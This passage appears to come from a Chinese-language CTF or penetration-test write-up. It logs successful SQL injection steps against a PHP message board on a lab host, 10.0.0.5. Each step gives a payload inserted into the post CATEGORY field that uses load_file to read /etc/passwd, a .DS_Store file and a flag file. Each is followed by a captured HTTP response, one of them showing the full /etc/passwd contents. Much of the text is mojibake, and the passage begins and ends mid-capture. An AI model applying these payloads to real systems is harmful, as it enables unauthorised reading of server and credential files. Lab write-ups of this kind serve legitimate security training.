rel=\"stylesheet\" href=\"/vendor/timepicker/jquery.timepicker.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/offline/theme.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/pace/theme.css\">\n\n\n    <link rel=\"stylesheet\" href=\"/bootstrap/css/bootstrap.min.css\">\n    <link rel=\"stylesheet\" href=\"/css/font-awesome.min.css\">\n    <link rel=\"stylesheet\" href=\"/css/animate.min.css\">\n\n    <link rel=\"stylesheet\" href=\"/css/panel.css\">\n\n    <link rel=\"stylesheet\" href=\"/css/skins/palette.1.css\" id=\"skin\">\n    <link rel=\"stylesheet\" href=\"/css/fonts/style.1.css\" id=\"font\">\n    <link rel=\"stylesheet\" href=\"/css/main.css\">\n\n    <script src=\"/vendor/modernizr.js\"></script>\n</head>\n\n<body>\n   <div class=\"app\">\n            <section class=\"main-content\">\n                <div class=\"content-wrap\">\n                    <div class=\"row\">\n                        <div class=\"col-lg-12\">\n                                <section class=\"panel\">\n                                <header class=\"panel-heading\"><font><font><b>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</b></font></font></header>\n                                <div class=\"panel-body\">\n                                    <form method=\"post\">\n                                    <div class=\"demo-button\">\n                                    <button type=\"button\" class=\"btn btn-success\" data-toggle=\"modal\" data-target=\"#addmodal\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>\n                                    </div>\n                                    </form>\n                                </div>\n                                <li class=\"table_line\"></li>\n                                <div class=\"panel-group\" id=\"accordion\">\n                                    <div class=\"panel\">\n                                            <div class=\"panel-body\">\n                                            <table class=\"table table-striped no-margin\">\n                                            <thead>\n                                            <tr>\n                                                <th class=\"col-lg-1\">ID</th>\n                                                <th class=\"col-lg-5\">CATEGORY</th>\n                                                <th class=\"col-lg-5\">TITLE</th>\n                                                <th class=\"col-lg-1\"></th>\n                                            </tr>\n                                            </thead>\n                                            <tbody>\n                                \n                                            </tbody>\n                                            </table>\n                                            </div>\n                                    </div>\n                                </div>\n                            </section>\n        </div>\n        </div>\n        </div>\n</section>\n<div class=\"modal fade bs-modal-md\" id=\"addmodal\" tabindex=\"-1\" role=\"dialog\" aria-hidden=\"true\">\n    <div class=\"modal-dialog modal-md\">\n        <div class=\"modal-content\">\n            <div class=\"modal-header\">\n                <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-hidden=\"true\">&times;</button>\n                <h5 class=\"modal-title text-center\" id=\"myModalLabel\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</h5>\n            </div>\n            <div class=\"modal-body\">\n                        <form class=\"form-horizontal bordered-group\" role=\"form\" action=\"./write_do.php?do=write\" method=\"post\" onsubmit=\"return submit_check()\">\n                            <div class=\"form-group\">\n                                <label class=\"col-sm-2 control-label\">TITLE</label>\n                                <div class=\"col-sm-5\">\n                                <input type=\"text\" class=\"form-control\" name=\"title\">\n                                </div>\n                            </div>\n                            <div class=\"form-group\">\n                                <label class=\"col-sm-2 control-label\">CATEGORY</label>\n                                <div class=\"col-sm-5\">\n                                <input type=\"text\" class=\"form-control\" name=\"category\">\n                                </div>\n                            </div>\n                            <div class=\"form-group\">\n                                <label class=\"col-sm-2 control-label\">CONTENT</label>\n                                <div class=\"col-sm-5\">\n                                <input type=\"text\" class=\"form-control\" name=\"content\">\n                                </div>\n                            </div>\n                            <div class=\"modal-footer\">\n                                <button type=\"submit\" class=\"btn btn-primary btn-sm\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>\n                            </div>\n                        </form>\n            </div>\n        </div>\n    </div>\n</div>\n\n</div>\n    <script src=\"/vendor/jquery-1.11.1.min.js\"></script>\n    <script src=\"/bootstrap/js/bootstrap.js\"></script>\n    <script src=\"/vendor/jquery.easing.min.js\"></script>\n    <script src=\"/vendor/jquery.placeholder.js\"></script>\n    <script src=\"/vendor/fastclick.js\"></script>\n\n\n    <script src=\"/vendor/bootstrap-select/bootstrap-select.js\"></script>\n    <script src=\"/vendor/dropzone/dropzone.js\"></script>\n    <script src=\"/vendor/parsley.min.js\"></script>\n    <script src=\"/vendor/fuelux/checkbox.js\"></script>\n    <script src=\"/vendor/fuelux/radio.js\"></script>\n    <script src=\"/vendor/fuelux/wizard.js\"></script>\n    <script src=\"/vendor/fuelux/pillbox.js\"></script>\n    <script src=\"/vendor/fuelux/spinner.js\"></script>\n    <script src=\"/vendor/slider/bootstrap-slider.js\"></script>\n    <script src=\"/vendor/bootstrap-datepicker/bootstrap-datepicker.js\"></script>\n    <script src=\"/vendor/wysiwyg/jquery.hotkeys.js\"></script>\n    <script src=\"/vendor/wysiwyg/bootstrap-wysiwyg.js\"></script>\n    <script src=\"/vendor/switchery/switchery.js\"></script>\n    <script src=\"/vendor/timepicker/jquery.timepicker.js\"></script>\n    <script src=\"/vendor/offline/offline.min.js\"></script>\n    <script src=\"/vendor/pace/pace.min.js\"></script>\n\n    <script src=\"/vendor/jquery.slimscroll.js\"></script>\n    <script src=\"/js/off-canvas.js\"></script>\n    <script src=\"/js/main.js\"></script>\n\n    <script src=\"/js/panel.js\"></script>\n    <script src=\"/js/forms.js\"></script>\n<script language=\"javascript\">  \nfunction submit_check(){\n    var gnl=confirm(\"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd?\");\n    if (gnl==true){\n        return true;\n    }\n    else{\n        return false;\n    }\n    }\n</script> \n\n</body>\n</html>\n"}
   ```

3. （成功动作）利用SQL注入，在发帖的CATEGORY内容中插入如下字符串："',content=(select load\_file('//etc/passwd'))/*"，重新读帖获得//etc/passwd文件的内容，获取时间为18:08:03。

   ```
   {"HTTP/1.1 200 OK\\r\\n": {"_ws.expert": {"http.chat": "", "_ws.expert.message": "HTTP/1.1 200 OK\\r\\n", "_ws.expert.severity": "2097152", "_ws.expert.group": "33554432"}, "http.response.version": "HTTP/1.1", "http.response.code": "200", "http.response.code.desc": "OK", "http.response.phrase": "OK"}, "http.date": "Sat, 22 Apr 2023 18:08:03 GMT", "http.response.line": "Content-Type: text/html\r\n", "http.server": "Apache/2.4.7 (Ubuntu)", "http.content_encoding": "gzip", "http.content_length_header": "1674", "http.content_length_header_tree": {"http.content_length": "1674"}, "http.connection": "Keep-Alive", "http.content_type": "text/html", "\\r\\n": "", "http.response": "1", "http.response_number": "79108", "http.time": "0.003643000", "http.prev_request_in": "3205072", "http.request_in": "3205162", "http.next_request_in": "3213375", "http.next_response_in": "3213381", "http.response_for.uri": "http://10.0.0.5/comment.php?id=1", "Content-encoded entity body (gzip): 1674 bytes -> 6916 bytes": "", "http.file_data": "<!doctype html>\n<html class=\"no-js\" lang=\"\">\n\n<head>\n\n    <meta charset=\"utf-8\">\n    <meta name=\"description\" content=\"\">\n    <meta name=\"viewport\" content=\"width=device-width, user-scalable=no, initial-scale=1, maximum-scale=1\">\n\n    <title>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</title>\n\n<style type=\"text/css\"> \n.AutoNewline \n{ \n  Word-break: break-all;\n} \n</style>\n    <link rel=\"stylesheet\" href=\"/vendor/bootstrap-select/bootstrap-select.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/dropzone/dropzone.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/slider/slider.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/bootstrap-datepicker/datepicker.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/timepicker/jquery.timepicker.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/offline/theme.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/pace/theme.css\">\n\n\n    <link rel=\"stylesheet\" href=\"/bootstrap/css/bootstrap.min.css\">\n    <link rel=\"stylesheet\" href=\"/css/font-awesome.min.css\">\n    <link rel=\"stylesheet\" href=\"/css/animate.min.css\">\n\n    <link rel=\"stylesheet\" href=\"/css/panel.css\">\n\n    <link rel=\"stylesheet\" href=\"/css/skins/palette.1.css\" id=\"skin\">\n    <link rel=\"stylesheet\" href=\"/css/fonts/style.1.css\" id=\"font\">\n    <link rel=\"stylesheet\" href=\"/css/main.css\">\n\n    <script src=\"/vendor/modernizr.js\"></script>\n</head>\n\n<body>\n            <section class=\"main-content\">\n                <div class=\"content-wrap\">\n                    <div class=\"row\">\n                        <div class=\"col-lg-12\">\n                            <div class=\"tab-content \">\n                                <section class=\"tab-pane active\">\n                                            <section class=\"panel\">\n                                                <header class=\"panel-heading\"><b>1</b></header>\n                                                <div class=\"panel-body\">\n                                                    <form class=\"form-horizontal bordered-group\" role=\"form\" method=\"post\" action=\"./write_do.php?do=comment\" onsubmit=\"return submit_check()\">\n                                                        <div class=\"form-group\">\n                                                            <label class=\"col-sm-2 control-label\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</label>\n                                                            <div class=\"col-sm-5\">\n                                                                <p>1</p>\n                                                            </div>\n                                                        </div>\n<div class=\"form-group\"><label class=\"col-sm-2 control-label\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</label><div class=\"col-sm-5\"><p>root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nlibuuid:x:100:101::/var/lib/libuuid:\nsyslog:x:101:104::/home/syslog:/bin/false\nmysql:x:102:105:MySQL Server,,,:/var/lib/mysql:/bin/false\nwww:x:500:500:www:/home/www:/bin/bash\n</p></div></div>                                                        <div class=\"form-group\">\n                                                            <label class=\"col-sm-2 control-label\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</label>\n                                                            <div class=\"col-sm-5\">\n                                                                <textarea name=\"content\" class=\"form-control\" rows=\"8\"></textarea>\n                                                                <input hidden name=\"bo_id\" value=\"1\">\n                                                            </div>\n                                                        </div>\n                                                        <div class=\"form-group\">\n                                                            <label class=\"col-sm-2 control-label\"></label>\n                                                            <div class=\"col-sm-10\">\n                                                                <button type=\"submit\" class=\"btn btn-success\"><i class=\"fa fa-check\"></i>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>\n                                                            </div>\n                                                        </div>\n                                                    </form>\n                                                </div>\n                                            </section>\n                                </section>\n                            </div>\n                        </div>\n                    </div>\n                </div>\n        </section>\n\n\n    <script src=\"/vendor/jquery-1.11.1.min.js\"></script>\n    <script src=\"/bootstrap/js/bootstrap.js\"></script>\n    <script src=\"/vendor/jquery.easing.min.js\"></script>\n    <script src=\"/vendor/jquery.placeholder.js\"></script>\n    <script src=\"/vendor/fastclick.js\"></script>\n\n\n    <script src=\"/vendor/bootstrap-select/bootstrap-select.js\"></script>\n    <script src=\"/vendor/dropzone/dropzone.js\"></script>\n    <script src=\"/vendor/parsley.min.js\"></script>\n    <script src=\"/vendor/fuelux/checkbox.js\"></script>\n    <script src=\"/vendor/fuelux/radio.js\"></script>\n    <script src=\"/vendor/fuelux/wizard.js\"></script>\n    <script src=\"/vendor/fuelux/pillbox.js\"></script>\n    <script src=\"/vendor/fuelux/spinner.js\"></script>\n    <script src=\"/vendor/slider/bootstrap-slider.js\"></script>\n    <script src=\"/vendor/bootstrap-datepicker/bootstrap-datepicker.js\"></script>\n    <script src=\"/vendor/wysiwyg/jquery.hotkeys.js\"></script>\n    <script src=\"/vendor/wysiwyg/bootstrap-wysiwyg.js\"></script>\n    <script src=\"/vendor/switchery/switchery.js\"></script>\n    <script src=\"/vendor/timepicker/jquery.timepicker.js\"></script>\n    <script src=\"/vendor/offline/offline.min.js\"></script>\n    <script src=\"/vendor/pace/pace.min.js\"></script>\n\n    <script src=\"/vendor/jquery.slimscroll.js\"></script>\n    <script src=\"/js/off-canvas.js\"></script>\n    <script src=\"/js/main.js\"></script>\n\n    <script src=\"/js/panel.js\"></script>\n    <script src=\"/js/forms.js\"></script>\n<script language=\"javascript\">  \nfunction submit_check(){\n    var gnl=confirm(\"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd?\");\n    if (gnl==true){\n        return true;\n    }\n    else{\n        return false;\n    }\n    }\n</script> \n</body>\n</html>\n"}
   ```

4. （成功动作）利用SQL注入，在发帖的CATEGORY内容中插入如下字符串:"1', content=(select hex(load\_file('/tmp/html/.DS\_Store'))),/*"，时间为18:22:02，读新帖获取.DS\_Store文件内容。

   ```
   {"HTTP/1.1 200 OK\\r\\n": {"_ws.expert": {"http.chat": "", "_ws.expert.message": "HTTP/1.1 200 OK\\r\\n", "_ws.expert.severity": "2097152", "_ws.expert.group": "33554432"}, "http.response.version": "HTTP/1.1", "http.response.code": "200", "http.response.code.desc": "OK", "http.response.phrase": "OK"}, "http.date": "Sat, 22 Apr 2023 18:22:02 GMT", "http.response.line": "Content-Type: text/html\r\n", "http.server": "Apache/2.4.7 (Ubuntu)", "http.content_encoding": "gzip", "http.content_length_header": "1746", "http.content_length_header_tree": {"http.content_length": "1746"}, "http.connection": "Keep-Alive", "http.content_type": "text/html", "\\r\\n": "", "http.response": "1", "http.response_number": "79157", "http.time": "0.003840000", "http.prev_request_in": "3242882", "http.request_in": "3243217", "http.next_request_in": "3243599", "http.next_response_in": "3243602", "http.response_for.uri": "http://10.0.0.5/index.php", "Content-encoded entity body (gzip): 1746 bytes -> 8185 bytes": "", "http.file_data": "<!doctype html>\n<html class=\"no-js\" lang=\"\">\n\n<head>\n\n    <meta charset=\"utf-8\">\n    <meta name=\"description\" content=\"\">\n    <meta name=\"viewport\" content=\"width=device-width, user-scalable=no, initial-scale=1, maximum-scale=1\">\n\n    <title>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</title>\n\n<style type=\"text/css\"> \n.AutoNewline \n{ \n  Word-break: break-all;\n} \n</style>\n    <link rel=\"stylesheet\" href=\"/vendor/bootstrap-select/bootstrap-select.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/dropzone/dropzone.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/slider/slider.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/bootstrap-datepicker/datepicker.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/timepicker/jquery.timepicker.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/offline/theme.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/pace/theme.css\">\n\n\n    <link rel=\"stylesheet\" href=\"/bootstrap/css/bootstrap.min.css\">\n    <link rel=\"stylesheet\" href=\"/css/font-awesome.min.css\">\n    <link rel=\"stylesheet\" href=\"/css/animate.min.css\">\n\n    <link rel=\"stylesheet\" href=\"/css/panel.css\">\n\n    <link rel=\"stylesheet\" href=\"/css/skins/palette.1.css\" id=\"skin\">\n    <link rel=\"stylesheet\" href=\"/css/fonts/style.1.css\" id=\"font\">\n    <link rel=\"stylesheet\" href=\"/css/main.css\">\n\n    <script src=\"/vendor/modernizr.js\"></script>\n</head>\n\n<body>\n   <div class=\"app\">\n            <section class=\"main-content\">\n                <div class=\"content-wrap\">\n                    <div class=\"row\">\n                        <div class=\"col-lg-12\">\n                                <section class=\"panel\">\n                                <header class=\"panel-heading\"><font><font><b>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</b></font></font></header>\n                                <div class=\"panel-body\">\n                                    <form method=\"post\">\n                                    <div class=\"demo-button\">\n                                    <button type=\"button\" class=\"btn btn-success\" data-toggle=\"modal\" data-target=\"#addmodal\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>\n                                    </div>\n                                    </form>\n                                </div>\n                                <li class=\"table_line\"></li>\n                                <div class=\"panel-group\" id=\"accordion\">\n                                    <div class=\"panel\">\n                                            <div class=\"panel-body\">\n                                            <table class=\"table table-striped no-margin\">\n                                            <thead>\n                                            <tr>\n                                                <th class=\"col-lg-1\">ID</th>\n                                                <th class=\"col-lg-5\">CATEGORY</th>\n                                                <th class=\"col-lg-5\">TITLE</th>\n                                                <th class=\"col-lg-1\"></th>\n                                            </tr>\n                                            </thead>\n                                            <tbody>\n                                \n<tr><td>1</td><td class='AutoNewline'>',content=(select load_file('//etc/passwd')),/*</td><td class='AutoNewline'>1</td>\n          <td>\n          <form method='get' action='./comment.php'>\n          <input hidden name='id' value='1'>\n          <button class='btn btn-danger btn-xs' type='submit'>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>      \n          </form>\n          </td>\n         </tr><tr><td>2</td><td class='AutoNewline'>1', content=(selecthex(load_file('/tmp/html/.DS_Store'))),/*</td><td class='AutoNewline'>2</td>\n          <td>\n          <form method='get' action='./comment.php'>\n          <input hidden name='id' value='2'>\n          <button class='btn btn-danger btn-xs' type='submit'>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>      \n          </form>\n          </td>\n         </tr><tr><td>3</td><td class='AutoNewline'>1', content=(select hex(load_file('/tmp/html/.DS_Store'))),/*</td><td class='AutoNewline'>3</td>\n          <td>\n          <form method='get' action='./comment.php'>\n          <input hidden name='id' value='3'>\n          <button class='btn btn-danger btn-xs' type='submit'>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>      \n          </form>\n          </td>\n         </tr>                                            </tbody>\n                                            </table>\n                                            </div>\n                                    </div>\n                                </div>\n                            </section>\n        </div>\n        </div>\n        </div>\n</section>\n<div class=\"modal fade bs-modal-md\" id=\"addmodal\" tabindex=\"-1\" role=\"dialog\" aria-hidden=\"true\">\n    <div class=\"modal-dialog modal-md\">\n        <div class=\"modal-content\">\n            <div class=\"modal-header\">\n                <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-hidden=\"true\">&times;</button>\n                <h5 class=\"modal-title text-center\" id=\"myModalLabel\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</h5>\n            </div>\n            <div class=\"modal-body\">\n                        <form class=\"form-horizontal bordered-group\" role=\"form\" action=\"./write_do.php?do=write\" method=\"post\" onsubmit=\"return submit_check()\">\n                            <div class=\"form-group\">\n                                <label class=\"col-sm-2 control-label\">TITLE</label>\n                                <div class=\"col-sm-5\">\n                                <input type=\"text\" class=\"form-control\" name=\"title\">\n                                </div>\n                            </div>\n                            <div class=\"form-group\">\n                                <label class=\"col-sm-2 control-label\">CATEGORY</label>\n                                <div class=\"col-sm-5\">\n                                <input type=\"text\" class=\"form-control\" name=\"category\">\n                                </div>\n                            </div>\n                            <div class=\"form-group\">\n                                <label class=\"col-sm-2 control-label\">CONTENT</label>\n                                <div class=\"col-sm-5\">\n                                <input type=\"text\" class=\"form-control\" name=\"content\">\n                                </div>\n                            </div>\n                            <div class=\"modal-footer\">\n                                <button type=\"submit\" class=\"btn btn-primary btn-sm\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>\n                            </div>\n                        </form>\n            </div>\n        </div>\n    </div>\n</div>\n\n</div>\n    <script src=\"/vendor/jquery-1.11.1.min.js\"></script>\n    <script src=\"/bootstrap/js/bootstrap.js\"></script>\n    <script src=\"/vendor/jquery.easing.min.js\"></script>\n    <script src=\"/vendor/jquery.placeholder.js\"></script>\n    <script src=\"/vendor/fastclick.js\"></script>\n\n\n    <script src=\"/vendor/bootstrap-select/bootstrap-select.js\"></script>\n    <script src=\"/vendor/dropzone/dropzone.js\"></script>\n    <script src=\"/vendor/parsley.min.js\"></script>\n    <script src=\"/vendor/fuelux/checkbox.js\"></script>\n    <script src=\"/vendor/fuelux/radio.js\"></script>\n    <script src=\"/vendor/fuelux/wizard.js\"></script>\n    <script src=\"/vendor/fuelux/pillbox.js\"></script>\n    <script src=\"/vendor/fuelux/spinner.js\"></script>\n    <script src=\"/vendor/slider/bootstrap-slider.js\"></script>\n    <script src=\"/vendor/bootstrap-datepicker/bootstrap-datepicker.js\"></script>\n    <script src=\"/vendor/wysiwyg/jquery.hotkeys.js\"></script>\n    <script src=\"/vendor/wysiwyg/bootstrap-wysiwyg.js\"></script>\n    <script src=\"/vendor/switchery/switchery.js\"></script>\n    <script src=\"/vendor/timepicker/jquery.timepicker.js\"></script>\n    <script src=\"/vendor/offline/offline.min.js\"></script>\n    <script src=\"/vendor/pace/pace.min.js\"></script>\n\n    <script src=\"/vendor/jquery.slimscroll.js\"></script>\n    <script src=\"/js/off-canvas.js\"></script>\n    <script src=\"/js/main.js\"></script>\n\n    <script src=\"/js/panel.js\"></script>\n    <script src=\"/js/forms.js\"></script>\n<script language=\"javascript\">  \nfunction submit_check(){\n    var gnl=confirm(\"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd?\");\n    if (gnl==true){\n        return true;\n    }\n    else{\n        return false;\n    }\n    }\n</script> \n\n</body>\n</html>\n"}
   ```

5. （成功动作）利用SQL注入，在发帖的CATEGORY内容中插入如下字符串:"1', content=(select hex(load\_file('/var/www/html/flag\_8946e1ff1ee3e40f.php'))),/*"，时间为：18:26:29，重新读帖获取flag，。

   ```
   {"HTTP/1.1 200 OK\\r\\n": {"_ws.expert": {"http.chat": "", "_ws.expert.message": "HTTP/1.1 200 OK\\r\\n", "_ws.expert.severity": "2097152", "_ws.expert.group": "33554432"}, "http.response.version": "HTTP/1.1", "http.response.code": "200", "http.response.code.desc": "OK", "http.response.phrase": "OK"}, "http.date": "Sat, 22 Apr 2023 18:26:29 GMT", "http.response.line": "Content-Type: text/html\r\n", "http.server": "Apache/2.4.7 (Ubuntu)", "http.content_encoding": "gzip", "http.content_length_header": "1791", "http.content_length_header_tree": {"http.content_length": "1791"}, "http.connection": "Keep-Alive", "http.content_type": "text/html", "\\r\\n": "", "http.response": "1", "http.response_number": "79164", "http.time": "0.002841000", "http.prev_request_in": "3252419", "http.request_in": "3252453", "http.next_request_in": "3252645", "http.response_for.uri": "http://10.0.0.5/index.php", "Content-encoded entity body (gzip): 1791 bytes -> 8585 bytes": "", "http.file_data": "<!doctype html>\n<html class=\"no-js\" lang=\"\">\n\n<head>\n\n    <meta charset=\"utf-8\">\n    <meta name=\"description\" content=\"\">\n    <meta name=\"viewport\" content=\"width=device-width, user-scalable=no, initial-scale=1, maximum-scale=1\">\n\n    <title>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</title>\n\n<style type=\"text/css\"> \n.AutoNewline \n{ \n  Word-break: break-all;\n} \n</style>\n    <link rel=\"stylesheet\" href=\"/vendor/bootstrap-select/bootstrap-select.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/dropzone/dropzone.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/slider/slider.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/bootstrap-datepicker/datepicker.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/timepicker/jquery.timepicker.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/offline/theme.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/pace/theme.css\">\n\n\n    <link rel=\"stylesheet\" href=\"/bootstrap/css/bootstrap.min.css\">\n    <link rel=\"stylesheet\" href=\"/css/font-awesome.min.css\">\n    <link rel=\"stylesheet\" href=\"/css/animate.min.css\">\n\n    <link rel=\"stylesheet\" href=\"/css/panel.css\">\n\n    <link rel=\"stylesheet\" href=\"/css/skins/palette.1.css\" id=\"skin\">\n    <link rel=\"stylesheet\" href=\"/css/fonts/style.1.css\" id=\"font\">\n    <link rel=\"stylesheet\" href=\"/css/main.css\">\n\n    <script src=\"/vendor/modernizr.js\"></script>\n</head>\n\n<body>\n   <div class=\"app\">\n            <section class=\"main-content\">\n                <div class=\"content-wrap\">\n                    <div class=\"row\">\n                        <div class=\"col-lg-12\">\n                                <section class=\"panel\">\n                                <header class=\"panel-heading\"><font><font><b>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</b></font></font></header>\n                                <div class=\"panel-body\">\n                                    <form method=\"post\">\n                                    <div class=\"demo-button\">\n                                    <button type=\"button\" class=\"btn btn-success\" data-toggle=\"modal\" data-target=\"#addmodal\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>\n                                    </div>\n                                    </form>\n                                </div>\n                                <li class=\"table_line\"></li>\n                                <div class=\"panel-group\" id=\"accordion\">\n                                    <div class=\"panel\">\n                                            <div class=\"panel-body\">\n                                            <table class=\"table table-striped no-margin\">\n                                            <thead>\n                                            <tr>\n                                                <th class=\"col-lg-1\">ID</th>\n                                                <th class=\"col-lg-5\">CATEGORY</th>\n                                                <th class=\"col-lg-5\">TITLE</th>\n                                                <th class=\"col-lg-1\"></th>\n                                            </tr>\n                                            </thead>\n                                            <tbody>\n                                \n<tr><td>1</td><td class='AutoNewline'>',content=(select load_file('//etc/passwd')),/*</td><td class='AutoNewline'>1</td>\n          <td>\n          <form method='get' action='./comment.php'>\n          <input hidden name='id' value='1'>\n          <button class='btn btn-danger btn-xs' type='submit'>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>      \n          </form>\n          </td>\n         </tr><tr><td>2</td><td class='AutoNewline'>1', content=(selecthex(load_file('/tmp/html/.DS_Store'))),/*</td><td class='AutoNewline'>2</td>\n          <td>\n          <form method='get' action='./comment.php'>\n          <input hidden name='id' value='2'>\n          <button class='btn btn-danger btn-xs' type='submit'>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>      \n          </form>\n          </td>\n         </tr><tr><td>3</td><td class='AutoNewline'>1', content=(select hex(load_file('/tmp/html/.DS_Store'))),/*</td><td class='AutoNewline'>3</td>\n          <td>\n          <form method='get' action='./comment.php'>\n          <input hidden name='id' value='3'>\n          <button class='btn btn-danger btn-xs' type='submit'>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>      \n          </form>\n          </td>\n         </tr><tr><td>4</td><td class='AutoNewline'>1', content=(select hex(load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/*</td><td class='AutoNewline'>4</td>\n          <td>\n          <form method='get' action='./comment.php'>\n          <input hidden name='id' value='4'>\n          <button class='btn btn-danger btn-xs' type='submit'>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>      \n          </form>\n          </td>\n         </tr>                                            </tbody>\n                                            </table>\n                                            </div>\n                                    </div>\n                                </div>\n                            </section>\n        </div>\n        </div>\n        </div>\n</section>\n<div class=\"modal fade bs-modal-md\" id=\"addmodal\" tabindex=\"-1\" role=\"dialog\" aria-hidden=\"true\">\n    <div class=\"modal-dialog modal-md\">\n        <div class=\"modal-content\">\n            <div class=\"modal-header\">\n                <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-hidden=\"true\">&times;</button>\n                <h5 class=\"modal-title text-center\" id=\"myModalLabel\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</h5>\n            </div>\n            <div class=\"modal-body\">\n                        <form class=\"form-horizontal bordered-group\" role=\"form\" action=\"./write_do.php?do=write\" method=\"post\" onsubmit=\"return submit_check()\">\n                            <div class=\"form-group\">\n                                <label class=\"col-sm-2 control-label\">TITLE</label>\n                                <div class=\"col-sm-5\">\n                                <input type=\"text\" class=\"form-control\" name=\"title\">\n                                </div>\n                            </div>\n                            <div class=\"form-group\">\n                                <label class=\"col-sm-2 control-label\">CATEGORY</label>\n                                <div class=\"col-sm-5\">\n                                <input type=\"text\" class=\"form-control\" name=\"category\">\n                                </div>\n                            </div>\n                            <div class=\"form-group\">\n                                <label class=\"col-sm-2 control-label\">CONTENT</label>\n                                <div class=\"col-sm-5\">\n                                <input type=\"text\" class=\"form-control\" name=\"content\">\n                                </div>\n                            </div>\n                            <div class=\"modal-footer\">\n                                <button type=\"submit\" class=\"btn btn-primary btn-sm\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>\n                            </div>\n                        </form>\n            </div>\n        </div>\n    </div>\n</div>\n\n</div>\n    <script src=\"/vendor/jquery-1.11.1.min.js\"></script>\n    <script src=\"/bootstrap/js/bootstrap.js\"></script>\n    <script src=\"/vendor/jquery.easing.min.js\"></script>\n    <script src=\"/vendor/jquery.placeholder.js\"></script>\n    <script src=\"/vendor/fastclick.js\"></script>\n\n\n    <script src=\"/vendor/bootstrap-select/bootstrap-select.js\"></script>\n    <script src=\"/vendor/dropzone/dropzone.js\"></script>\n    <script src=\"/vendor/parsley.min.js\"></script>\n    <script src=\"/vendor/fuelux/checkbox.js\"></script>\n    <script src=\"/vendor/fuelux/radio.js\"></script>\n    <script src=\"/vendor/fuelux/wizard.js\"></script>\n    <script src=\"/vendor/fuelux/pillbox.js\"></script>\n    <script src=\"/vendor/fuelux/spinner.js\"></script>\n    <script src=\"/vendor/slider/bootstrap-slider.js\"></script>\n    <script 